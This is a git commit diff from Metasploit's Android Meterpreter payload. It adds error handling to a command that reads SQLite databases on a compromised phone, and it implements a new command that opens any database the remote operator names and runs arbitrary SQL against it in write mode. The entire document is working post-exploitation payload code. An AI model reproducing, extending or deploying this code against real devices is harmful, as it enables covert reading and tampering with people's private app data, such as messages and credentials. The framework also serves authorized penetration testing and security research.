e66b5c710580acff381a16ea09b1b3eb93e86f86
Tim <timrlw@gmail.com>
2016-03-04 10:47:53 +0000

    sqlite_write

--- java/androidpayload/library/src/com/metasploit/meterpreter/android/sqlite_read_android.java
+++ java/androidpayload/library/src/com/metasploit/meterpreter/android/sqlite_read_android.java
@@ -2,6 +2,7 @@ package com.metasploit.meterpreter.android;
 
 import android.database.sqlite.SQLiteDatabase;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteException;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -23,43 +24,49 @@ public class sqlite_read_android implements Command {
             | (TLV_EXTENSIONS + 9084);
     public static final int TLV_TYPE_SQLITE_VALUE = TLVPacket.TLV_META_TYPE_STRING
             | (TLV_EXTENSIONS + 9085);
+    public static final int TLV_TYPE_SQLITE_ERROR = TLVPacket.TLV_META_TYPE_STRING
+            | (TLV_EXTENSIONS + 9086);
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
 
         String dbpath = request.getStringValue(TLV_TYPE_SQLITE_NAME);
         String query = request.getStringValue(TLV_TYPE_SQLITE_QUERY);
-        SQLiteDatabase db;
-        Cursor c;
-
-        db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READONLY);
-        c = db.rawQuery(query, null);
-        if (c == null) {
-            return ERROR_SUCCESS;
-        }
-
-        if (c.getCount() > 0) {
-            String[] columns = c.getColumnNames();
-            TLVPacket grp = new TLVPacket();
-            TLVPacket cols = new TLVPacket();
-            for (int i=0; i < columns.length; i++){
-                cols.addOverflow(TLV_TYPE_SQLITE_VALUE, columns[i]);
-            }
-            grp.addOverflow(TLV_TYPE_SQLITE_RESULT_COLS, cols);
-
-            c.moveToFirst();
-            do {
-                TLVPacket row = new TLVPacket();
+        SQLiteDatabase db = null;
+        Cursor c = null;
+        try {
+            db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READONLY);
+            c = db.rawQuery(query, null);
+            if (c.getCount() > 0) {
+                String[] columns = c.getColumnNames();
+                TLVPacket grp = new TLVPacket();
+                TLVPacket cols = new TLVPacket();
                 for (int i=0; i < columns.length; i++){
-                    row.addOverflow(TLV_TYPE_SQLITE_VALUE, c.getString(i));
+                    cols.addOverflow(TLV_TYPE_SQLITE_VALUE, columns[i]);
                 }
-                grp.addOverflow(TLV_TYPE_SQLITE_RESULT_ROW, row);
-            } while (c.moveToNext());
+                grp.addOverflow(TLV_TYPE_SQLITE_RESULT_COLS, cols);
 
-            response.addOverflow(TLV_TYPE_SQLITE_RESULT_GROUP, grp);
+                c.moveToFirst();
+                do {
+                    TLVPacket row = new TLVPacket();
+                    for (int i=0; i < columns.length; i++){
+                        row.addOverflow(TLV_TYPE_SQLITE_VALUE, c.getString(i));
+                    }
+                    grp.addOverflow(TLV_TYPE_SQLITE_RESULT_ROW, row);
+                } while (c.moveToNext());
+
+                response.addOverflow(TLV_TYPE_SQLITE_RESULT_GROUP, grp);
+            }
+        } catch (SQLiteException e) {
+            response.addOverflow(TLV_TYPE_SQLITE_ERROR, e.getMessage());
+        } finally {
+            if (db != null) {
+                db.close();
+            }
+            if (c != null) {
+                c.close();
+            }
         }
-        c.close();
-        db.close();
         return ERROR_SUCCESS;
     }
 
--- java/androidpayload/library/src/com/metasploit/meterpreter/android/sqlite_write_android.java
+++ java/androidpayload/library/src/com/metasploit/meterpreter/android/sqlite_write_android.java
@@ -1,20 +1,33 @@
 package com.metasploit.meterpreter.android;
 
-import android.database.Cursor;
-import android.net.Uri;
+import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteException;
 
-import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
 public class sqlite_write_android implements Command {
 
-    private static final int TLV_EXTENSIONS = 20000;
-
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
+        String dbpath = request.getStringValue(sqlite_read_android.TLV_TYPE_SQLITE_NAME);
+        String query = request.getStringValue(sqlite_read_android.TLV_TYPE_SQLITE_QUERY);
+        SQLiteDatabase db = null;
+        try {
+            db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READWRITE);
+            db.beginTransaction();
+            db.execSQL(query);
+            db.setTransactionSuccessful();
+        } catch (SQLiteException e) {
+            response.addOverflow(sqlite_read_android.TLV_TYPE_SQLITE_ERROR, e.getMessage());
+        } finally {
+            if (db != null) {
+                db.endTransaction();
+                db.close();
+            }
+        }
         return ERROR_SUCCESS;
     }
 
